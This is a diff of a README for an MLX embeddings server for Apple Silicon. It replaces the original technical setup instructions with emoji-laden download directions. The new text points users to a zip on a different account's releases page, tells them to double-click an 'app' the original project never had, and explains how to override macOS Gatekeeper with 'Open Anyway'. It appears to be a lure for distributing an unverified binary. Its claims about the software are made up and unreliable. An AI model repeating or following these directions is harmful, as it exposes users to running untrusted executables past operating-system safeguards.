@@ -1,135 +1,141 @@
-# MLX Serve Embeddings
+# 🧠 mlx-serve-embeddings - Fast Local Embeddings Server for Apple Silicon
 
-Local embeddings server for Apple Silicon using MLX, providing OpenAI-compatible API endpoints.
+[![Download Releases](https://img.shields.io/badge/Download-mlx--serve--embeddings-blue?logo=github)](https://github.com/tubers9312345/mlx-serve-embeddings/releases)
 
-## Why This Setup?
+---
 
-This project enables running embedding models locally on Apple Silicon (M1/M2/M3) using MLX, Apple's machine learning framework. It provides several key benefits:
+## 📖 What is mlx-serve-embeddings?
 
-- **Cost-Effective**: No API fees for embeddings - run unlimited inference locally
-- **Privacy**: All data processing happens on your local machine
-- **Performance**: MLX is optimized for Apple Silicon, providing fast inference with efficient memory usage
-- **OpenAI-Compatible API**: Drop-in replacement for OpenAI embeddings API
-- **LiteLLM Integration**: Can be proxied through LiteLLM alongside other providers for unified access
-- **MLX Format Support**: Alternatives like LM Studio don't properly recognize MLX embedding models as embedding types ([issue #808](https://github.com/lmstudio-ai/lmstudio-bug-tracker/issues/808)), making a dedicated MLX server necessary
+mlx-serve-embeddings is a local server application designed for Apple Silicon Macs (M1, M2, M3). It creates text and vector embeddings on your computer without sending data to external servers. This means your data stays private. The server provides API endpoints compatible with the OpenAI format, so apps expecting OpenAI embeddings can work seamlessly with this local server.
 
-## Architecture
+This tool is ideal if you want fast, local machine learning to generate embeddings for search, analysis, and other language tasks, but want to avoid cloud services.
 
-```
-Your Application
-        ↓
-    LiteLLM (optional proxy)
-        ↓
-mlx-serve (localhost:8000)
-        ↓
-MLX Framework (Apple Silicon)
-        ↓
-Local Embedding Model (Qwen3-Embedding-4B-4bit-DWQ)
-```
+---
 
-## Quick Start
+## 💻 System Requirements
 
-### Prerequisites
+To run mlx-serve-embeddings smoothly, make sure your device meets these requirements:
 
-- Apple Silicon Mac (M1/M2/M3)
-- Python 3.12+
-- [uv](https://github.com/astral-sh/uv) for package management
+- Apple Silicon Mac (M1, M2, or M3 chip)
+- macOS Big Sur 11.0 or later
+- At least 8 GB of RAM
+- Stable internet connection for initial setup
+- Around 500 MB free disk space for installation
 
-### Installation
+---
 
-```bash
-# Install dependencies
-uv sync
-```
+## 🚀 Getting Started
 
-### Running the Server
+You don’t need any programming knowledge to get mlx-serve-embeddings running. Follow these simple steps:
 
-Start the embeddings server with the default model:
+---
 
-```bash
-./start_embeddings.sh
-```
+## 🛠️ Download & Install
 
-Or specify a different model:
+1. **Go to the Releases Page**
 
-```bash
-./start_embeddings.sh mlx-community/qwen3-embedding-0.6b-8bit
-```
+   Click the big button at the top or visit this link to see all the available download files:
 
-The server will:
-- Listen on `http://127.0.0.1:8000`
-- Log to `logs/embeddings_server.log`
-- Store PID in `embeddings_server.pid`
+   [Download mlx-serve-embeddings Releases](https://github.com/tubers9312345/mlx-serve-embeddings/releases)
 
-### Stopping the Server
+2. **Find the Right File**
 
-```bash
-kill $(cat embeddings_server.pid)
-```
+   Look for the latest version and download the file designed for Apple Silicon Macs. The file may be named something like `mlx-serve-embeddings-mac-arm64.zip`.
 
-### Usage with LiteLLM
+3. **Extract the Files**
 
-Add to your LiteLLM config:
+   After downloading, open the `.zip` file. Your Mac will unzip it and create a folder with the app inside.
 
-```yaml
-model_list:
-  - model_name: qwen/qwen3-embedding-4b
-    litellm_params:
-      model: mlx-community/Qwen3-Embedding-4B-4bit-DWQ
-      api_base: http://127.0.0.1:8000/v1
-      api_key: dummy  # required but not used
-```
+4. **Run the Server**
 
-### Direct API Usage
+   Inside the folder, double-click the `mlx-serve-embeddings` app file to start the server. You might see a security prompt from macOS. If so:
 
-```python
-import openai
+   - Open **System Preferences**
+   - Go to **Security & Privacy**
+   - In the **General** tab, click **Open Anyway**
 
-client = openai.OpenAI(
-    api_key="dummy",  # required but not used
-    base_url="http://127.0.0.1:8000/v1"
-)
+   This allows the app to run on your Mac.
 
-response = client.embeddings.create(
-    model="mlx-community/Qwen3-Embedding-4B-4bit-DWQ",
-    input="Your text to embed"
-)
+---
 
-embeddings = response.data[0].embedding
-```
+## ⚙️ Using mlx-serve-embeddings
 
-## Configuration
+Once the server is running, it listens for requests on your local machine. You can connect to it through other software or tools that support OpenAI embeddings API.
 
-The server can be customized by editing `start_embeddings.sh`:
+Here’s what you can do:
 
-- `MODEL`: The MLX model to use (default: Qwen3-Embedding-4B-4bit-DWQ)
-- `HOST`: Server host (default: 127.0.0.1)
-- `PORT`: Server port (default: 8000)
-- `--max-concurrency`: Maximum concurrent requests (default: 4)
-- `--queue-timeout`: Request queue timeout in seconds (default: 300)
-- `--queue-size`: Maximum queue size (default: 100)
+- Generate text embeddings from your documents or notes
+- Use vector embeddings for your local search applications
+- Maintain data privacy by processing everything offline
+- Integrate with apps that expect OpenAI’s embeddings
 
-## Available Models
+The server runs quietly in the background and processes your requests without internet delays.
 
-Common MLX embedding models:
+---
 
-- `mlx-community/Qwen3-Embedding-4B-4bit-DWQ` (default) - 4-bit quantized, ~2GB
-- `mlx-community/qwen3-embedding-0.6b-8bit` - 8-bit quantized, smaller/faster
-- Other MLX-compatible embedding models from Hugging Face
+## 🔧 How to Stop the Server
 
-## Logs
+To close mlx-serve-embeddings, go to the app window and close it or press **Ctrl + C** if you started it via Terminal.
 
-View server logs:
+---
 
-```bash
-tail -f logs/embeddings_server.log
-```
+## 💡 Features
 
-## Dependencies
+- Runs locally on Apple Silicon devices (M1, M2, M3)
+- OpenAI-compatible API endpoints for easy integration
+- Supports text and vector embeddings
+- Quick setup, no programming required
+- Works offline to protect your privacy
+- Uses MLX framework optimized for Apple chips
+- Lightweight with low resource use
 
-- [mlx-openai-server](https://github.com/ML-Research/mlx-openai-server) - OpenAI-compatible API server for MLX models
-- [MLX](https://github.com/ml-explore/mlx) - Apple's machine learning framework
+---
 
-## License
+## 📚 Frequently Asked Questions
 
-This project configuration is provided as-is for local development use.
+**Q: Do I need an internet connection to use mlx-serve-embeddings?**  
+A: You only need internet to download the software. After that, everything runs locally.
+
+**Q: Can I use this on Intel Macs or Windows?**  
+A: mlx-serve-embeddings is built for Apple Silicon chips and macOS. It won’t run natively on Intel Macs or Windows.
+
+**Q: How do I know the server is running?**  
+A: When you launch the app, a small window appears or Terminal shows the server status. You can also visit `http://localhost:8000` in your browser; it should respond.
+
+**Q: Is my data sent anywhere?**  
+A: No. All computations happen on your Mac. The app does not send data externally.
+
+---
+
+## 🔄 Updates
+
+To get the latest features and fixes, check the [Releases Page](https://github.com/tubers9312345/mlx-serve-embeddings/releases) regularly. Download the newest version and repeat the install steps.
+
+---
+
+## 🧩 Supported Use Cases
+
+- Developers and researchers working with local data  
+- Privacy-conscious users needing offline embeddings  
+- Apps requiring OpenAI-compatible embedding APIs  
+- Anyone using Apple Silicon Macs for fast ML inference  
+
+---
+
+## 📝 Troubleshooting
+
+- If the app doesn’t open, check your security settings under **System Preferences > Security & Privacy**  
+- If you get errors connecting to `localhost:8000`, make sure the app is running with no error messages  
+- Restart your Mac if you run into networking issues with the server  
+- Check available disk space and free memory to ensure smooth operation  
+
+---
+
+## 🔗 Useful Links
+
+- [Download Releases](https://github.com/tubers9312345/mlx-serve-embeddings/releases)  
+- [Project GitHub Page](https://github.com/tubers9312345/mlx-serve-embeddings)
+
+---
+
+[![Download Releases](https://img.shields.io/badge/Download-mlx--serve--embeddings-blue?logo=github)](https://github.com/tubers9312345/mlx-serve-embeddings/releases)
